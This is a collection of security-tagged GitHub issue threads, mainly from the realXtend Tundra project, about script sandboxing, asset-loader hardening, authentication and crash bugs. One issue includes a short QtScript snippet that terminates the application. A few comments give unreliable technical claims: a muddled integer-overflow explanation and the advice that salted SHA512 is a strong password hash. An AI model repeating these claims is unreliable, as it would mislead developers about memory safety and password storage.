https://github.com/scrapy/scrapy/issues/457#issuecomment-28919683 solution doesn't have these problems. There is a gotcha with redirects where `allowed_protocols` should be reset. I wonder if it even worths to make `Request.replace` take care of it, resetting `alowed_protocols` where url is changed (+ copy existing replace to `Request._replace_unsafe`). 
I'm ok with @kmike's `allowed_protocols` proposal

`RedirectMiddleware` needs other changes too, for example removing `proxy` key from Request.meta when scheme changes, and also removing some HTTP headers (get rid of proxy-specific header for example) in redirected requests.
This is a good opportunity to clean/tighten it up.

What's the core maintainers' take on this? CC @dangra , @nramirezuy , @pablohoffman , @kmike 
@redapple I don't know if removing the proxy is a good idea, also the cookies may not change. Did you checked how the browser handle it?
@nramirezuy , if the redirected URL of a proxied request changes scheme, the proxy doesn't change (e.g. use an HTTPS proxy for an http:// URL), that feels weird and wrong, and python-requests doesn't do that.
My comment was to remove the ""proxy"" key, so it's added in the rest of the downloader chain later if necessary. That's not strictly part of this issue.
",no,"help wanted,security,"
tsyesika/MegBot,11826474,"CTCP flood protection","We've got zero flood protection in our CTCP module at the moment. This is a well known attack, so shouldn't be too hard to mitigate.
","Does MegBot even _need_ to respond to CTCP?
",no,"Feature,Security,"
KristianLyng/bwreg2,144649,"Password encryption","Passwords are not encrypted in the database (?).
",,no,"Security,fix-for-2.1,"
chrwei/ArchReactorOS,168126,"Change installer chmod 777 requests","Chmod'ding to 777 is BAD.
Instruct site admins to change the file owner and if required set file permissions to 660 or 770 for directories.
",,no,"Security,Code Improvement,"
realXtend/tundra,2200225,"Remove use for qt.uitools extension in all provided examples.","The files
bin\jsmodules\apitest\qtscriptgen_example.js(4):engine.ImportExtension(""qt.uitools"");
bin\scenes\ChatApplication\ChatApplication.js(8):engine.ImportExtension(""qt.uitools"");
\bin\scenes\Mumble\MumbleApplication.js(43):    engine.ImportExtension(""qt.uitools"");
bin\scenes\MumbleUI\MumbleApplication.js(32):    engine.ImportExtension(""qt.uitools"");

use the qt.uitools extension to spawn qt widgets from .ui files. Rewrite all examples to use QtUiAsset::Instantiate instead, which is the more flexible mechanism.
",,no,"Security,Regression/Bitrot,"
realXtend/tundra,3270921,"Add support for limiting the amount of content in a client scene.","To disallow memory exhaustion attacks, implement configurable hard limits (both client and server side, where applies) on at least the following:
1. Number of concurrent connections. Number of concurrent connections from a single IP (these are potential for kNet level)
2. Number of scenes. Number of entities in a scene. Number of components in an entity. Number of attributes in a component.
3. Maximum length of variable-length content in attributes.
4. Maximum length of entity action messages.
5. Number of asset storages.
6. Number of assets in the Asset API. Number of concurrent transfers in the Asset API.
7. Maximum asset size, both encoded and decoded (asset-specific).
   What else?
",,no,"Feature Request,Security,Performance,Graphics/Visual,"
realXtend/tundra,3897776,"Large scenes crash on std::bad_alloc.","If a scene has a lot of content, it crashes when running out of memory, often inside QScriptEngine register file allocation code.

Investigate what could be done to avoid crashing, and e.g. instead simply limit the amount of shown content in the scene, if it contains too much data.
","This has now been investigated in some detail.

The major memory consumption is caused by Ogre using D3DPOOL_MANAGED for all textures and meshes, which results in CPU-side cached copies of the assets to be stored in main RAM. The test scene where this occurs (Oulu 3D) contains about 500MB of texture assets which kills the CPU-side memory consumption.

See http://www.ogre3d.org/forums/viewtopic.php?f=3&t=51096
and http://www.ogre3d.org/forums/viewtopic.php?f=2&t=50410

The big problem is that Ogre does not support using D3DPOOL_DEFAULT without D3DUSAGE_DYNAMIC set. Options:

1) Implement support in Ogre to specify D3DPOOL_DEFAULT without D3DUSAGE_DYNAMIC.
2) Add a mechanism in Asset API to cap the maximum number of textures used.
3) Work around the issue by authoring scenes in a more memory-conserving manner.

Currently investigating the effort required for 1) and 2), and doing some added profiling to see where else memory is potentially wasted.
Related to #449.
",no,"Security,Research,Bug,Performance,Windows,"
realXtend/tundra,4150334,"Authentication hook is synchronous","The UserAboutToConnect signal in the Server doesn't leave room for querying an authentication backend
without blocking the server event loop. An async-friendly API should be added to enable authenticating against
external components.
","Seconded.
",no,"Feature Request,Security,Performance,"
realXtend/tundra,3271087,"Implement secure Ogre mesh, material and texture asset loading.","Audit through Ogre asset loaders for meshes, materials and textures.
Fix all potential vectors for buffer overflows, crashes and performance-related attacks. Enable specifying limits on decoded asset sizes for the loaders.

The branch https://bitbucket.org/clb/ogre-safe-nocrashes/overview was created to allow hosting this work.
",,no,"Feature Request,Security,Ogre,"
realXtend/tundra,2896624,"Add support for Lua or AngelScript scripting.","Due to dozens of problems and missing features related to QtScript correctness and performance, add support for creating in-world scripts with either Lua or AngelScript. (preferably both [tell me which is better afterwards {I am serious}]).
","i made the boilerplate for a Lua scripting module using QtLua a while ago, is uncommitted on my laptop at home - i could check it in the evening and push somewhere. qtlua seemed pleasant to work with so far at least, i've no idea how it performs in the c++ <-> lua conversions

for performance and other things can be a good idea to test the PythonQt thing we already have in and working, it at least reuses the qobject instances cleverly afaik
For the remainder of this issue item, you may post all odd snippets which crash inside Qt, or silently fail, or similar. (you may also create a separate issue for them)

Here is one:

var v = float3.zero;
v.x = 1;
print(v); // Prints (0,0,0)
print(float3.zero); // Prints (0,0,0)

Above v is initialized to be a reference of float3.zero. Because float3.zero is read-only (you can't make the zero vector non-zero), assigning to v is not allowed. However, QtScript will silently ignore the statement 'v.x = 1;' without issuing an error (which I think is a bug in QtScript itself).

To allow assigning v.x = 1;, the constant float3.zero should be made to behave like a value type, but it is not possible with QtScript (or JavaScript) (afaik).
Pypy claims to have a safe Python sandbox: http://doc.pypy.org/en/latest/sandbox.html
There is also an internal QtScript bug related to printing variables, which can crash the server, but I will not disclose that until the bug has been fixed inside Qt.
Using Python for inworld scripts would require
a) The ability to create separate script contexts per EC_Script component.
b) Implement the support to use the script class mechanism for Python as well.
c) Safe automatic teardown of script contexts. (can use a OnScriptDestroyed mechanism for those features that require C-like free()s)
d) Implement several bindings to Python (i.e. issues #34, #35, #36, and related ones)
Making static QtScript bindings for parts of Tundra might be a good thing -- and the possible performance improvement of that is easy to test, posted details of that and some other ideas in http://groups.google.com/group/realxtend-dev/browse_thread/thread/380c061b2e3b0042
There now exist a bindings generator and an interop mechanism for MathGeoLib to Angelscript, available for testing here: https://dl.dropbox.com/u/40949268/emcc/MathGeoLibTestAS.html This code runs Angelscript in a web browser and contains the MathGeoLib library to play with.
There is a work-in-progress integration branch of angelscript to Tundra at https://github.com/LudoCraft/Tundra/tree/angelscript
Nice. This is quite welcome if gives perf gains. If Angescript can be ran on browser clients (like .js can) too thats a bonus.
",no,"Feature Request,QtScript,Usability,Security,Research,Bug,Performance,"
realXtend/tundra,3271108,"Implement secure Ogre particle system loading.","Audit through Ogre asset loader for particle systems.
 Fix all potential vectors for buffer overflows, crashes and performance-related attacks. Enable specifying limits on decoded asset sizes for the loader.

The branch https://bitbucket.org/clb/ogre-safe-nocrashes/overview was created to allow hosting this work.
",,no,"Feature Request,Security,Ogre,"
realXtend/tundra,3067219,"QtScript code can cause Tundra main process to exit().","Executing the script file shown in the ConTEXT editor window in

http://dl.dropbox.com/u/40949268/Tundra/qtscript_exit.png

results in qtscript generator executing a qFatal() log message, which ends up in

http://dl.dropbox.com/u/40949268/Tundra/qtscript_exit2.png

calling exit() for the whole process in qglobal.cpp.

Script execution should be safe in a sandbox, and should not be allowed to crash the client.
","As a workaround, disallow scripts from being executed from the server, or disallow qt.xml from being allowed on the client. Sadly, this naturally disables xml handling in the script code.
",no,"QtScript,Security,Bug,Qt,"
realXtend/tundra,3271137,"Implement secure audio asset loading.","Audit through the current codepaths for loading .wav and .ogg assets.
Fix up any security-related issues in them. Enable specifying a max size for decoded assets.
",,no,"Feature Request,Security,"
realXtend/tundra,1842818,"Un-referred images added to / under storage dir are loaded and eat gfx mem","with current tundra2 head on windows:
1. open some scene from x:\some\dir\my.txml
2. add images to e.g. x:\some\dir\images\

Tundra prints:
File /some/dir/images/frame000138.jpg found from watch list so it must be modified. Asset ref:
ame000138.jpg

These images are not referred to by anything in the scene or anywhere.

Leads to a crash when tex mem runs out if a lot of images are added.

We work around this now by putting the txml in a different subdir where don't add anything else. A bug anyhow.
","When autodiscovery==true for an asset storage, new assets should be added as (Unloaded) into the assets window, i.e. only the knowledge of that asset existing should have been added, but the asset should not be loaded.

Note that when an asset is loaded in memory, and the corresponding file is deleted from disk, the asset itself will not be immediately deleted from memory, to allow the scene to still display with it. If the asset goes to/or was in unloaded state, it will be removed from the asset api, since no copy of the asset data exists anywhere anymore.

Does this happen on D3D or OGL? Unless Ogre does something odd with D3D, it should not be possible to run out of VRAM, since D3D evicts unused textures from the GPU to make room for those that are actually in use (when using the D3D9 Managed pool). I am uncertain if OGL supports a similar feature.
As a workaround, set autodiscovery false for the asset storage in question.
This was with D3D, and our initial observation of the crash was actually wrong: the crash was in the new camera image save func, and not related to this.

Otherwise the original report is correct - we observed the usage in profiler, where the amount of textures and texture mem usage increased.
",no,"Usability,Security,Bug,Performance,Ogre,"
realXtend/tundra,3308905,"Bullet crashes on malformed mesh input.","A bad mesh input can crash Bullet when it is producing a BVH hierarchy for the mesh. A crash site looks like
http://dl.dropbox.com/u/40949268/Tundra/bugs/bullet_rollercoaster_fence_mesh_assert.png. A test case rollercoaster_fence.mesh has been archived.
","Could you please link to the mesh in question for testing?
",no,"Security,Bug,"
realXtend/tundra,3271042,"Audit QtScript access to core APIs.","Perform a security audit to all core APIs from the script access viewpoint. Produce a technical report or a patch stating what kind of access mechanism should be implemented/augmented on top of #363  to the current core APIs.
","Few things I've been at least thinking: even a trusted script should not be able to call framework.Exit() or server.Stop()/.Start() on the server side or the client for that matter.

Modal dialogs could be also not be allowed as they can block the main loop. I'm not sure if you could even hide it somehow that you can't even make it go away. QMessageBox/QDialog and friends should probably be blacklisted, anything that has .exec()?

Should we make some kind of doxy page to start adding stuff or list things here?
For security, let alone speed, I would suggest switching from qtScript to V8 (which has sandboxed JS execution).
also here, not related - the interpreter used does not affect this sandboxing question
True, as commented to #542, the bulk of the security problems come from http://code.google.com/p/qtscriptgenerator/
For me the most obvious solution/mechanism, although cumbersome, would be expose none of Tundra classes/structs/functions/symbols to QtScript ""automatically"" (qScriptRegisterQObjectMetaType et. al), but use the QScriptBindings tool for each Tundra symbol we want to expose and hide potentially unsecure functions using the [noscript] tag. This would also help us to get rid of plenty unnecessary moc cruft/overhead caused by making many of the classes QObject by default as we want them to be usable in QtScript, even if no f.ex. signal-slot feature is needed.
I think this approach can be interesting also because AFAIK it can allow subclassing / implementing things in js/py.

I.e. the same way as you can now implement a QWidget in js or py, one could also implement IComponent, which could perhaps help with the prob and there is now no nice way to define components outside c++ so that the EC editor would work nicely for them (can just add a named component which then gets prepopulated with the right attrs -- is more manual with DynamicComponent)

this would be the kind of normal way to have static bindings for scripting / non-c++ app dev. the upside (and a reason) for the current qobject magic is that it requires no (or very little) extra work for c++ devs as slots are automagically callable etc -- i didn't want to impose a lot of manual work neither for someone devving only c++ core things and not wanting to worry about scripting, nor for myself to manually maintain script bindings to back-then quite living core code. 

perhaps things have changed now that scripting is used heavily, people don't mind working to support it well, and core is not in a flux so we wouldn't be needing to update the bindings all the time.
This sounds interesting but how would this be exactly integrated into our build steps, or would it be a separate script you run every time you want to update what is accessible in js? If I understood right Framework and Core APIs would be built as script plugin dlls to `bin/qtplugins/tundra/framework.dll` etc. and using framework would be `engine.IncludeExtension(""tundra.framework""); or something like that?

Also I think both should be available, for 3rd party or the current Application plugins its very easy way to just expose few QObject via the metasystem in the code. But we could start by making Framework and Core APIs use this nicer .dll path.

Also are there are speed benefits of using them from .dll. I guess script init and engine prep would be faster without us exposing everything (all framework dynamic qobjects) there even if you don't need it.
Note that QScriptBindings and QtScriptGenerator are two totally different things. The former is a tool written by @juj which resides in src/Application/JavascriptModule/ QScriptBindings and is already used to expose MathGeoLib classes to QtScript.

Script binding generation would be roughly like this:
0) Audit all existing code and mark down insecure/unwanted functions et. al with ""/// [noscript]""
1) When committing new code, actively follow step 0
2) run doxygen for Tundra and make it generate XML output instead of HTML
3) run QScriptBindings for the XML file and specify explicitly all symbols that are wanted to expose
4) add register_ClassNameHere_prototype(engine); calls to ScriptMetaTypeDefines.cpp
5) build Tundra
ah, right, knew that but thought you were referring to the latter, the xml based c++ generating thing used by qtscript and pythonqt. don't know which is better / more suitable.
",no,"QtScript,Security,Research,"
realXtend/tundra,3271167,"Implement secure avatar asset loading.","After the feature #369 has been implemented, audit through the avatar asset loader code, and fix up any security-related issues in the loader. Add support for specfying maximum decoded content sizes for the avatar asset loader.
",,no,"Feature Request,Security,"
realXtend/tundra,6435298,"Client crash when server denies connection in Server::UserAboutToConnect handler","I'm making logic to deny client connections depending on the users authentication. My code is in C++ if that matters. In my slot handler for TundraLogic::Server::UserAboutToConnect signal i call UserConnection::DenyConnection(). Server does what its supposed to do but the client that was denied crashes.

It is crashing inside kNet MessageConnection.cpp. I've attached some dump stack screenshots that maybe light the situation more. The ptr the code is running inside is shows as null and connection state as disconnected when it crashes on processing the message queue. Is my debug panels showing bogus stuff or is it possible that another thread deletes the MessageConnection*?

Also tell me if this needs to go to kNet repos issue tracker. It is heavily tundra related but I dont know where the actual bug is (if there is one).

Edit: I'll add that this happens randomly but usually many times in a row until I restart server and client.

<b>Screenshots</b>

https://dl.dropbox.com/u/3589544/code/knet/disconnect-dump-0.png
https://dl.dropbox.com/u/3589544/code/knet/disconnect-dump-1.png
https://dl.dropbox.com/u/3589544/code/knet/disconnect-dump-2.png

<b>Server log</b>

<pre>
Warning: Permissions: Denying new client connection #1 jonnenau. No permission to join scene.
[SERVER] ID 1 client 'jonnenau' was denied access [127.0.0.1:55201]
[SERVER] ID 1 client 'jonnenau' disconnected
</pre>


<b>Client log</b>

<pre>
0.000: Network::Connect: Sent a UDP Connection Start datagram to to 127.0.0.1:2345 (UDP, connected=true, readOpen: true, writeOpen
: true, maxSendSize=1400, sock: 127.0.0.1:55201, peer: 127.0.0.1:2345, socket: 2864, this: 2DC2CF80).
0.0111184, 2355F540: Created a new NetworkWorkerThread. There are now 1 worker threads.
0.0148139, 23556A48: NetworkWorkerThread starting main loop.
0.0512893, 23556A48: UDPMessageConnection::ReadSocket: Received data from socket 127.0.0.1:2345 (UDP, connected=true, readOpen: tr
ue, writeOpen: true, maxSendSize=1400, sock: 127.0.0.1:55201, peer: 127.0.0.1:2345, socket: 2864, this: 2DC2CF80). Transitioned fr
om ConnectionPending to ConnectionOK state.
0.123205, 2355F540: MessageConnection::Disconnect(500 msecs): Write-closing connection. connectionState = ConnectionOK, socket rea
dOpen:true, socket writeOpen:true.
0.13103, 2355F540: UDPMessageConnection::SendDisconnectMessage: Sent Disconnect.
0.134624, 23556A48: UDPMessageConnection::SendOutPacket: Send Disconnect from connection 127.0.0.1:2345 (UDP, connected=true, read
Open: true, writeOpen: false, maxSendSize=1400, sock: 127.0.0.1:55201, peer: 127.0.0.1:2345, socket: 2864, this: 2DC2CF80).
0.146996, 2355F540: Deleted a NetworkWorkerThread. There are now 0 worker threads left.
0.150953, 2355F540: Socket::Close(): Closing socket 127.0.0.1:2345 (UDP, connected=true, readOpen: true, writeOpen: false, maxSend
Size=1400, sock: 127.0.0.1:55201, peer: 127.0.0.1:2345, socket: 2864, this: 2DC2CF80).
0.160954, 2355F540: Socket::Close(): Socket shutdown(SD_BOTH) succeeded on socket 127.0.0.1:2345 (UDP, connected=true, readOpen: t
rue, writeOpen: false, maxSendSize=1400, sock: 127.0.0.1:55201, peer: 127.0.0.1:2345, socket: 2864, this: 2DC2CF80).
0.172211, 2355F540: Network::DeleteSocket: Closed socket 2DC2CF80.
Disconnected
Client logged out.
</pre>
","It's an integer overflow. The pointer *msg is valued at hex: 0x2dd6bba38 decimal: 12304759352. size_t, the data type for knet::NetworkMessage is a 64 bit safe allocator for an unsigned integer, or 4294967295. 4294967295 - 12304759352 = (-8009792057), which results in an integer overflow. This is a kNet side integer overflow, and kNet should have logic to handle integer overflows, but looking at the code, it doesn't look like it does. I've forked kNet, and I'll look in to it.
Also; obligatory information on Integer Overflows, just so you can understand the nature of what it is: 

https://www.owasp.org/index.php/Integer_overflow
http://cwe.mitre.org/data/definitions/190.html
http://stackoverflow.com/questions/199333/best-way-to-detect-integer-overflow-in-c-c

And because I phracking can:
http://www.phrack.org/issues.html?issue=60&id=10
http://www.phrack.org/issues.html?issue=60&id=9
Hmm sound a bit weird. What would cause this then? The message works most of the time, the message ""payload"" is the same except varying client connection id depending who gets denied. Good that you have some insight on this, I would still wait for @juj to comment before working on kNet too much :)
I don't know. The thing that stood out to me was that the message size was way too big for a size_t type. It might have some sort of method to break down the size in to smaller chunks to allow for it to parse it, however if not, it's an integer overflow. The whole reason integer overflows happen is because you put a number in a type that's larger than the type it self. That winds up wrapping over in to other memory allocation blocks that it's not supposed to, causing the crash. That's part of how shell code (code used in a vulnerability exploit to gain a shell on a target machine) tends to work. I'll toss a bug report up on kNet if it's not up already, however I'll need to do more digging to figure it out. Right now my primary goal is getting the build script fixes I'm working on cleaned up, after which, I may move to this, or other stuff depending on the situation.
Well, imo the login message response seems to be filled correctly, actually the same message is used for successful login too, with same params. If you look at the way knet DataSerializer and DataDeserializer works they shouldn't do overflows. You use templated Read and Add functions that put exactly the corrects stuff into the message. The client uses the same struct information to parse the message, and if you put too much bytes afaik those are just ignored, or if you dont have enough bytes for read operations knet will throw ""not enough bytes in message id x"". This triggers are protocol mismatch situation and automatically disconnects the client from the server, I think this a Tundra safety feature so the misbehaving protocol client wont do crazy stuff to the server.

Here is the login reply in question on this issue https://github.com/realXtend/naali/blob/tundra2/src/Core/TundraProtocolModule/MsgLoginReply.h#L39
The struct is used to form the message on the server with SerializeTo() and used to read in client with DeserializeFrom(). So if those functions match to Size() all should be good. loginReplyData is where the xml response of the deny reason should be transfered back to client.

I'm a bit confused atm. You might be onto something but my hunch is that worker thread frees  the message\* while main thread is still processing them. Thats why the msg\* is carbage and the asset(msg) crashes the run.
Does this occur deterministically?  Is this reproducible from a scene that implements a script that denies connections? If so, can you zip up a test scene that shows the issue?
",no,"Security,Bug,"
realXtend/tundra,3270976,"Add support for specifying the trust state of a storage at runtime.","In the Assets window, add a mechanism for toggling whether a storage is trusted or not.
",,no,"Feature Request,Security,"
realXtend/tundra,4751894,"QtScript scriptObjects array object may crash if printed.","Marking down an untested todo:

It is possible that printing out the list of script objects in a script can crash inside Qt. Review whether this is the case and fix by 
converting to using JavaScript associative arrays instead of numeric arrays.
","Any test cases/input how to manifest the bug so could be checked and fixed?
Example script snippet to reproduce this is simple, but in order to prevent possible malicious usage, I would prefer not to enclose the information publicly. I can provide the information in private (email, IRC, etc.).
",no,"QtScript,Security,Bug,Qt,"
realXtend/tundra,3270755,"Rewrite the script execution security mechanism.","Currently, the whitelist/blacklist mechanism implemented in JavascriptInstance.cpp is based on a 'gut feeling' without real auditing to security, and e.g. issue #341 escapes this blacklist. To allow more comprehensive options for managing client-side safety, rewrite the script execution logic as follows:
1. By default, executing all scripts from external asset storages is disabled. Scripts from the local system are allowed to run.
2. Then, add a command line parameter --allow_external_scripts which takes one of the values 0,1,2 or 3, with the meaning:
   - 0: Do not execute scripts from external trusted asset storages.
   - 1: Allow execution of scripts from trusted asset storages, but do not allow any script extensions to be imported in them.
   - 2: Allow execution of scripts from trusted asset storages, but only allow them to utilize the whitelisted script extensions.
   - 3: Allow execution of scripts from trusted asset storages, with all script extensions enabled.
3. Then, add a command line parameter --allow_untrusted_scripts which takes one of the values 0,1,2 or 3, with the same meanings as above, but these apply to scripts from untrusted sources.
4. Then, rework the script asset request mechanism in EC_Script to NOT request a script asset if the execution of that script is disabled altogether. (to avoid it ending up in the asset cache, which enables a potential untrust source if an attacker somehow manages to tamper with the cache)
","What would be a default for lets say viewer-browser.xml that is usually used when starting a login from a web portal.

All scripts that show anything visible or offers some functionality to the end user must at least have qt.core and qt.gui. I understand the white and blacklists are quite bad but how would any worlds really have any funtionality without some extension? I assume the 1 option would be default as it is now, trusted storages can use the whitelisted extensions and classes?
For untrusted storages 0, for trusted storages 2. Also an option would be to allow the user to specify the level of trust when choosing to trust a storage.
",no,"QtScript,Security,"
realXtend/tundra,3270962,"Add command line support for disabling the use of certain asset types.","Add support for specifying for each asset type (.png, .mesh, .material, ...) and for each storage type (local, trusted, untrusted), whether the assets are allowed to be loaded or not.
","--nomesh --notexture --nomaterial? :) I assume when these would be detected by the modules that register the assets factories and they would simply register a null factory? This should be pretty trivial if we can just decide the command line param names. For the separated local, trusted, untrusted might get a bit tricky, plus will add quite significant amount of different start params --nolocalmesh --notrustedmesh --nountrustedmesh etc.?
",no,"Feature Request,Security,"
realXtend/tundra,1670342,"Implement support for a user account database with personalized password.","Extend the simple server login password check script to show an example of how to create a user account database with personalized passwords for each user.
","A few security features that should be essential:
1. Random salts: Generate a salt for the passwords that is different for each user. This is required to protect against rainbow table attacks.
2. Hashing the password: Use SHA512; MD5 is easy to crack, and SHA1 is fairly easy to pwn as well. SHA512 is probably one of the best hashing methods out there for passwords right now. It is heavy on resources, however it is worth it due to the difficulty to crack compared to other hashes.
3. SQLi protection: Do I really need to mention this?
",no,"Feature Request,Security,"
realXtend/tundra,1671785,"Show ongoing asset downloads in the Assets window.","The assets window only shows finished transfers, and unloaded assets.

Extend it to show all the currently running asset transfers, with a % completed progress bar.
",,no,"Feature Request,Usability,Security,"
realXtend/tundra,1670451,"Implement support for creating user rights management scripts, and provide users with script examples.","Currently all users who log in to a scene can modify everything at will, there is no access control. The current SyncManager contains some signal hooks, but it is not yet complete enough to be useful in practice (examples below)

Implement an appropriate set of signals to SyncManager in TundraProtocolModule, and provide example scripts which show how to successfully use the mechanism to create servers with different kinds of access control.

The following use cases should be supportable, and example scripts (preferably have a set of bin/scenes/ scripts like with AvatarApplication and ChatApplication) should be provided as documentation and tests to help working against any future regressions:
- Some users are denied from making any modifications to the scene, except moving their own avatar. Other users in the scene can do modifications. (Restrict everything on a per-user basis)
-  Some users can modify some attributes of entities, but not everything. For example, an user could have restricted access to move some objects around in the scene, but cannot move all objects in the scene, and cannot alter any other attributes than the position, and cannot create or delete any objects in the scene. (Restrict individual entity/component/attribute create/modify/delete operations on a per-user basis)
-  Each object has an ownership associated to it. An user can create new objects, and have ownership of it. An user can give ownership of an object to someone else, and each user can only move or delete the objects they own. (Restrict individual entity/component/attribute create/modify/delete operations on a per-object basis)
- Users can be associated with permissions, which dictate what they can do. A script/configuration can define what the used set of permissions is (Restrict individual operations on a per-capability basis)
- For some applications, attempts to perform restricted operations should fail silently. For other cases, the clients should receive (a script-driven) an error message of an unlawful action. In either case, the scenes cannot be allowed to end up out-of-sync between the server and the clients, but the original scene state needs to be eventually remain.
",,no,"Feature Request,Documentation,Security,"
realXtend/tundra,1671788,"Show ongoing asset uploads in the Assets window.","If assets are being uploaded outside the import dialog, for example when re-saving an asset modified in memory, there is no information shown about it. 

Show all the currently running asset uploads in the Assets window, so that this process is not hidden from the user.
",,no,"Feature Request,Usability,Security,"
realXtend/tundra,3271017,"Add support for UI popups asking whether to trust a storage or not.","Add a command line option, which enables a UI dialog that asks from the user whether to trust a new asset storage or not. Implement a memory/history of currently trusted storages.
","Heh, this was kind of what I implemented to begin with. Popup once and remembering the storages base url  to config :) Though I implemented it only for script assets and in JavaScriptModule that was the wrong place to begin with.

I'm curious btw, if user says http://adminotech.com/assets/ can be trusted, are assets from deeper than that path also trusted as a results of that eg. http://adminotech.com/assets/test/scenes/mworld/jack.mesh, assuming this is set as a absolute url in a asset ref attribute? How does the current mechanism work with that situation?
",no,"Feature Request,Security,"
realXtend/tundra,4063387,"Using QAbstract* classes Terminate the Application Execution","Run script with following code:
v = new QAbstractButton();
v.show();

This terminates the application execution immediately with the following error print:
QAbstractButton::paintEvent() is abstract!

As a solution maybe blacklist all QAbstract\* classes?

QAbstractAnimation
QAbstractButton
QAbstractEventDispatcher
QAbstractExtensionFactory
QAbstractExtensionManager
QAbstractFileEngine
QAbstractFileEngineHandler
QAbstractFileEngineIterator
QAbstractFontEngine
QAbstractFormBuilder
QAbstractGraphicsShapeItem
QAbstractItemDelegate
QAbstractItemModel
QAbstractItemView
QAbstractListModel
QAbstractMessageHandler
QAbstractNetworkCache
QAbstractPrintDialog
QAbstractProxyModel
QAbstractScrollArea
QAbstractSlider
QAbstractSocket
QAbstractSpinBox
QAbstractState
QAbstractTableModel
QAbstractTextDocumentLayout
QAbstractTransition
QAbstractUriResolver
QAbstractVideoBuffer
QAbstractVideoSurface
QAbstractXmlNodeModel
QAbstractXmlReceiver
","I suppose the Abstract classes are there so that you can subclass them to make own custom widgets. That may be more valuable than blacklisting the classes to avoid such programming errors.

The current qtscript js env in general is not really made for having services run untrusted scripts from where ever. There may be all kinds of ways to close the process (at least from py can just use the QApplication object etc). But a malicious script could also for example just create entities indefinitely till the app crashes.

The focus with the sandboxing and blacklisting so far has been to prevent system and network access so that there wouldn't be ways to do something actually harmful (like steal data).

But to not crash, it is basically the script devs responsiblity to not do crazy things.

Of course would be great if the qtscript env never crashed, dunno if that and similar cases could be handled as exceptions or checked somehow.
It is not possible to subclass QAbstractXXX classes from qt script, or rather, the mechanisms you can use to simulate subclassing do not utilize virtual functions or QAbstractXXX classes. See http://lists.trolltech.com/qt-interest/2008-05/thread00812-0.html

Also, it is not possible to avoid crashing here, since after the error message, the QScriptBindings immediately call qFatal, which calls system exit().
Ah, in that case it's just useless to have those classes in the namespace and filtering them out is good.

The link seems somewhat unrelated, as it only mentions that with the glue that qtscript generator generates, subclassing in general is possible. Doesn't mention anything about that not working for abstract classes, but I can take your word for it :)
You can subclass abstract classes in js, and all its pure virtual functions:

``` javascript
CustomButton.prototype = new QAbstractButton();

function CustomButton(parent)
{
    QAbstractButton.call(this, parent);
    // etc. etc.
}

CustomButton.prototype.paintEvent = function(paintEvent)
{
    // your code
}
```
The point was that the mechanism used in QtScript to do 'subclassing' does not have anything to do with C++ virtual functions, e.g. trying to implement a C++ virtual function in QtScript and then calling that virtual function from C++ code will not result in the script function being called.

That is what I meant by 'the mechanisms you can use to simulate subclassing do not utilize virtual functions'. In QtScript, one either replaces properties/qscriptvalues of an object, or replaces the prototype object, or replaces the properties of the prototype, but those are strictly QScriptEngine features, and don't utilize C++ virtual functions and do not require C++ QAbstractXXX classes.
All QAbstract*\* should definitely be killed from the QtScript -exposed bindings code.
A better idea would be to switch to V8 for JS. V8 to my understanding already has a lot of implementation of sandboxing, and it's also one of (if not) the fastest JS VMs out there.

It's better to use a newer, sandboxed JS implementation rather than an old (potentially) insecure one like qtScript. It's also generally not a good idea to use one that has had development ceased on it for over a year. Who knows how many security vulnerabilities are in the code for qtScript.
afaik qtscript itself is similarily secure as js envs in general. qtscript actually is not a js interpreter, but uses something existing, iirc from mozilla by default (scriptmonkey or something?). and there's a branch of qtscript which uses V8 instead. but that does not change the typical question with security in Tundra js.

the question about sandboxing in Tundra has to do with what kind of underlying API functionality we want to have as available for untrusted scripts. if you expose a RemoveFile func to scripting, it doesn't matter what js engine you are using -- that's something we don't want to have in the sandbox for untrusted code.

But the same mechanism for configuring (blacklists, whitelists) visibility of Qt funcs can be used to beautify the API if it indeed is better to hide those Abstract classes -- JS side can well just implement/subclass Button etc. concrete classes. I guess only possible benefit of having the Abstracts there would be if someone is (mindlessly) porting existing qt c++ code to js, and gets confused then if some baseclass is not available with the same name. At least the error message from qt seems meaningful when someone tries to use an abstract class improperly, so doesn't seem most horribly broken there.
",no,"QtScript,Security,Bug,"
realXtend/tundra,2200253,"Add support for HTTP Basic Auth for HTTP asset uploads.","Currently, Tundra HttpAssetProvider can do HTTP uploads only if the destination allows HTTP PUT commands without authorization. Add support for specifying HTTP credentials in a HttpAssetStorage.
","I would also like to see custom header map that would be put as the PUT headers. For example some REST APIs use custom headers to do auth and all sorts of things. Maybe this generic map of headers would solve the auth issue as well, the calling script could prefill it.

I'd also like me to have ""http://example.com/upload/"" storage, id like to upload something there without the upload process automatically assuming the asset is now in http://example.com/upload/filename. I'd suggest inspecting ""Location"" header when the PUT returns and reading if the location of the created asset was somewhere else. This is problematic though as the upload transfer actually uses the storage to make the full url, so for any ""Location"" header youd need to create new in mem storage to the system and switch the storage ptr in the transfer. Anyhow i feel this should be supported so one can do services that actually put the assets where it likes and simply returns where it put the file.
",no,"Feature Request,Security,"
realXtend/tundra,3370550,"Clean up scene/entity/component/attribute XML serialization API.","Rewrite the scene serialization and deserialization API to that it is uniform and consistent for serializing and deserializing scenes, entities, components and attributes.

Enable script access for both serialization and deserialization.
If the script API cannot be implemented without redundant data copying, implement separate C++ functions which avoid redundant memory work.

Delete QByteArray Scene::GetEntityXml(Entity *entity) const;  (see QString Entity::SerializeToXMLString() const;)

Plus points if the API is such that it can be accessed and utilized from scripts so that they don't necessarily require the insecure qt.xml extension.
",,no,"Feature Request,QtScript,Security,"
realXtend/tundra,1093409,"Tundra should have permission/security support","I believe @antont will be working on this :)
","Initial work is done by antont, closing this (test issue) for now.
should be completed by implementing this:

Tässä eilinen tekstidokumentti

Synkkaprotokollan permissiot

ei coreen poltettu suojaus
- serveri on ""allow everything"" oletuksena

core ei määrittele ennalta käyttöoikeusmallia (UAC/ACL/capsbit -mekanismia
tms.)
Ei capabiliteetti x rooli -matriisia tms. kiinteää UAC/ACL -mallia.

Ei yleistä kaikkien omaan käyttöön laajennettavaa mekanismia/APIa tms.
- kNet-kanava on avoin -> vapaa broadcast

*\* Ei datan piilotusta serverissä: Ainakaan aluksi

Pitää voida rakentaa O(1) data -security
- Ei fiksattua per-entity tai per-client -permissioita.
- ""ECPermissions"" coren ulkopuolinen add-on

Clientti ei torju serveriltä tulevaa dataa
- serveri aina autoritatiivinen, permissiohookit disabloitu clientillä

Default: Allow from all -> Reject
- permissiohookeista ei voi sanoa accept message, vain reject message.

Security hookit:
- Server::UserAboutToConnect
- SyncManager::
